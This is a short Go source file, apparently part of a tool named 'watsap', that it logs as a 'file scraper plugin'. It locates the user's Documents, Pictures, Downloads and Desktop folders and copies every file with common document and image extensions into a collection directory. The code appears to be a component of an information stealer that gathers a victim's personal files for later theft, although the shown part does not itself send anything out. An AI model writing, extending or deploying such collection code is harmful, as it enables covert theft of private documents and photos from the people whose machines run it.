package files

import (
	"fmt"
	"os"
	"path/filepath"
	"watsap/utils/config"
)

var extensions = []string{
	".txt", ".jpg", ".png", ".jpeg", "heif",
	".pdf", ".docx", ".xlsx", ".pptx",
	".doc", ".xls", ".ppt",
}

func getSourceDirectories() []string {
	var baseDir string
	if config.Platform == "windows" {
		baseDir = os.Getenv("USERPROFILE")
	} else {
		baseDir = os.Getenv("HOME")
	}
	if baseDir == "" {
		config.Logger("[File] Error: HOME or USERPROFILE environment variable not set", "error")
		return nil
	}
	dirs := []string{
		filepath.Join(baseDir, "Documents"),
		filepath.Join(baseDir, "Pictures"),
		filepath.Join(baseDir, "Downloads"),
		filepath.Join(baseDir, "Desktop"),
	}
	return dirs
}

func InitFiles() {
	config.Logger("[File] Starting file scraper plugin", "default")
	config.Logger("[File] srcDirs: "+fmt.Sprintf("%v", getSourceDirectories()), "default")
	config.Logger("[File] dstDir: "+config.FilesDir, "default")
	config.Logger("[File] extensions: "+fmt.Sprintf("%v", extensions), "default")

	srcDirs := getSourceDirectories()
	if srcDirs == nil {
		return
	}
	dstDir := config.FilesDir
	if err := copyFilesWithExtensions(srcDirs, dstDir, extensions); err != nil {
		config.Logger(fmt.Sprintf("[File] Error copying files: %v", err), "error")
	}
}
